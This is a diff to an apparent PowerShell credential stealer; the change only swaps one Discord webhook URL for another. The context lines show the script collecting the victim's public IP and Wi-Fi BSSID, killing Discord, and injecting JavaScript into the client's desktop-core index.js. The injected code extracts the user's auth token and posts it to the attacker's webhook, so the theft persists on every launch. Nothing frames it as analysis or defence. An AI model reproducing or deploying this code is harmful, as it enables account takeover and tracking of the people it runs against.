@@ -1,5 +1,5 @@
 
-$w='https://discord.com/api/webhooks/1491415697044144138/5sppLO1MUwlcNTkp4SJuSWoAkAd8CEvpa30wQOCdr8PZBouHUGEhyr1TGiQO2uYCr8zh';
+$w='https://discord.com/api/webhooks/1491757973813592106/iExPACCLwXkwELyQP3umFFblHEguwriYgJt2SQCYCUlAPMadnMISKqVDA6eecFbOLgzU';
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
 $ip=try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'};
 $b=try{((netsh wlan show int|sls BSSID).ToString().Split(':')[1..6]-join':').Trim()}catch{'N/A'};
@@ -19,7 +19,7 @@ Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue;
 $f=(Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1);
 if($f){
     $js=@'
-const {app,net}=require("electron"),U="https://discord.com/api/webhooks/1491415697044144138/5sppLO1MUwlcNTkp4SJuSWoAkAd8CEvpa30wQOCdr8PZBouHUGEhyr1TGiQO2uYCr8zh";let l=null;
+const {app,net}=require("electron"),U="https://discord.com/api/webhooks/1491757973813592106/iExPACCLwXkwELyQP3umFFblHEguwriYgJt2SQCYCUlAPMadnMISKqVDA6eecFbOLgzU";let l=null;
 app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`(function(){const f=()=>{try{window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m of Object.keys(r.c).map(x=>r.c[x].exports)){if(m&&m.default&&typeof m.default.getToken=="function"){let t=m.default.getToken();if(typeof t==="string"){console.log("T:"+t);return true}}}}])}catch(e){}return false};if(!f()){const i=setInterval(()=>{if(f())clearInterval(i)},1000)}})()`)}) ;
 w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("T:")){const t=m.split("T:")[1];if(t!==l&&t.length>10){l=t;const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**Token:** `"+t+"`"}));r.end()}}})});
 module.exports=require("./core.asar");
